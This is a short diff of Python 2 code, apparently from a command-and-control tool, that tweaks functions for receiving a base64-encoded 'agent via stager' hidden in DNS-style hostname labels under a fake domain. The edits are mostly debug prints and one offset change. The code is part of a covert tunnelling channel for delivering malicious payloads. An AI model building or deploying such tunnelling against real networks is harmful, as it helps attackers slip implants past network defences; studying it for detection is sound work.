@@ -784,8 +784,6 @@ def pack_hostname_a(prefix, labels, fake_domain):
     return bytes_prefix_host + labels + bytes_fake_host
 
 def extract_payload(payload):
-    #print binascii.hexlify(payload)
-    # TODO is the 12 byte offset correct?
     ba = bytearray(payload[12:])
     tmpstr = ""
     hostname = []
@@ -800,8 +798,9 @@ def extract_payload(payload):
 
     if len(hostname) == 3:
         print "Hostname {}.{}.{}".format(hostname[0],hostname[1],hostname[2])
-    label = str(ba[12:-1])
-    print "Extracted label {} from pkt".format(label)
+
+    label = str(ba[18:-1])
+    #print "Extracted label {} from pkt".format(binascii.hexlify(label))
     return label
     
 def recv_data_from_listener(prefix, sock, fake_domain, host, port):
@@ -828,11 +827,14 @@ def recv_data_from_listener(prefix, sock, fake_domain, host, port):
                 print "breaking"
                 break
             b64_label = extract_payload(agent_tmp)
+            #print "B64 " + str(b64_label)
             txn_int += 1
             agent_base64.append(b64_label)
+            print "b64_label: {}".format(b64_label)
         except socket.timeout:
             pass
     ba = bytearray()
+    print agent_base64
     for ele in agent_base64:
         ba.extend(binascii.a2b_base64(ele))
     print 'agent recv via stager length {}'.format(len(ba))
@@ -840,8 +842,8 @@ def recv_data_from_listener(prefix, sock, fake_domain, host, port):
     return a
 
 def is_end_of_transfer(payload):
-    print "PAYLOAD: {}".format(binascii.hexlify(payload))
-    print "PAYLOAD: {}".format(binascii.hexlify(payload[7]))
+    #print "PAYLOAD: {}".format(binascii.hexlify(payload))
+    #print "PAYLOAD: {}".format(binascii.hexlify(payload[7]))
     if binascii.hexlify(payload)[7] == '3':
         return True
     else:
